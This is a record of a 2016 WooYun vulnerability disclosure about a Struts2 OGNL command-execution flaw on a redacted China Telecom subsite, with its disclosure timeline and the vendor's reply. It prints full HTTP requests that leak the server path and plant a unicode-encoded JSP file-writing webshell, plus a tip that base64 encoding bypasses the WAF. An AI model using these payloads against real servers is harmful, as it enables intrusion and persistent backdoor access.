{"id": 87674, "wybug_id": "wooyun-2016-0200521", "wybug_title": "中国电信189.cn某分站命令执行漏洞修复不当导致getshell                                      ", "wybug_corp": "中国电信", "wybug_author": "撸撸侠", "wybug_date": "2016-04-25 19:40", "wybug_open_date": "2016-06-12 14:10", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-12：\t细节向公众公开  简要描述： 中国电信189.cn某分站命令执行漏洞修复不当导致getshell有简单的waf防护 详细说明：  http://**.**.**.** st2命令执行漏洞\nPOST / HTTP/1.1User-Agent: curl/7.33.0Host: **.**.**.**Accept: */*Proxy-Connection: Keep-AliveContent-Length: 204Content-Type: multipart/form-data;boundary=--------------------------------------------------Content-Disposition: form-data; name=\"redirect:/${#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletRequest\").getRealPath(\"/\")}\"-1--------------------------\n   漏洞证明：  \nPOST / HTTP/1.1User-Agent: curl/7.33.0Host: **.**.**.**Accept: */*Proxy-Connection: Keep-AliveContent-Length: 1727Content-Type: multipart/form-data;boundary=--------------------------------------------------Content-Disposition: form-data; name=\"redirect:/${\"x\"+(new **.**.**.**.PrintWriter(\"/home/ecss/emallTelWeb8082/webapps/emallTelWeb/ss.jsp\")).append(\"\\u003c\\u0025\\u0040\\u0070\\u0061\\u0067\\u0065\\u0020\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u003d\\\"\\u0073\\u0075\\u006e\\u002e\\u006d\\u0069\\u0073\\u0063\\u002e\\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\\"\\u0025\\u003e\\u003c\\u0025\\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u0020\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u0020\\u003d\\u0020\\u006e\\u0065\\u0077\\u0020\\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u0028\\u0029\\u003b\\u006e\\u0065\\u0077\\u0020\\u006a\\u0061\\u0076\\u0061\\u002e\\u0069\\u006f\\u002e\\u0046\\u0069\\u006c\\u0065\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002e\\u0067\\u0065\\u0074\\u0052\\u0065\\u0061\\u006c\\u0050\\u0061\\u0074\\u0068\\u0028\\\"\\u002f\\\"\\u0029\\u002b\\\"\\u002f\\\"\\u002b\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\\"\\u0066\\\"\\u0029\\u0029\\u002e\\u0077\\u0072\\u0069\\u0074\\u0065\\u0028\\u0028\\u006e\\u0065\\u0077\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0028\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\\u002e\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\\"\\u0063\\\"\\u0029\\u0029\\u0029\\u0029\\u002e\\u0067\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073\\u0028\\u0029\\u0029\\u003b\\u0025\\u003e\").close()}\"-1--------------------------\n写小马  然后写入菜刀马（base64加密提交即可绕过waf）\n\n\n\n   修复方案：     版权声明：转载请注明来源 撸撸侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2016-04-28 14:06 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国电信集团公司通报,由其后续协调网站管理部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-26 01:08 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:653 漏洞数:83        | 慢慢来,不急)\t\t \n  6666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}